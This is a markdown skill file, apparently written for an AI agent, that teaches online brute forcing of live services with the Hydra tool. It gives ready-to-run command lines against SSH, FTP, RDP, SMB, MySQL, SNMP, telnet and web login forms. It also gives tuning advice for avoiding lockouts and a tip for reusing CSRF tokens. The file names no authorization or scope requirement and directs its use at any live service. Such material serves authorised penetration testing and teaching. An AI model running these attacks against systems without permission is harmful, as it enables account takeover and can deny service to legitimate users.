---
name: hydra-brute
description: "Online brute forcing with Hydra: protocol selection, form attacks, and avoiding lockouts. Use this skill when brute forcing a live service."
---

# Hydra

## Overview

Hydra performs online brute force against a running service. Slower than hash cracking but works where hashes are unavailable.

## Basic

```bash
hydra -l admin -P pass.txt ssh://10.0.0.5
hydra -L users.txt -P pass.txt ftp://10.0.0.5
hydra -l root -P pass.txt rdp://10.0.0.5
hydra -L users.txt -P pass.txt smb://10.0.0.5
```

## HTTP forms

```bash
# POST form
hydra -l admin -P pass.txt 10.0.0.5 http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials"

# GET
hydra -l admin -P pass.txt 10.0.0.5 http-get-form \
  "/login?u=^USER^&p=^PASS^:F=Login failed"
```

Response matching:
- `F=` failure string
- `S=` success string
- `H=Cookie: x` additional header

## Tuning

```bash
-t 4      # threads (lower for lockout-sensitive targets)
-W 3      # wait between attempts
-f        # stop after the first success
-V        # verbose
```

## Service-specific

```bash
hydra -l admin -P pass.txt mysql://10.0.0.5
hydra -l admin -P pass.txt rdp://10.0.0.5
hydra -P pass.txt snmp://10.0.0.5
hydra -l admin -P pass.txt 10.0.0.5 telnet
```

## Pitfalls

- High thread counts lock accounts and can DoS the service.
- `F=` must match the actual failure page — verify manually first.
- CSRF tokens break form attacks; fetch and reuse a token.

## Verification

The credential must log in successfully through the normal client.
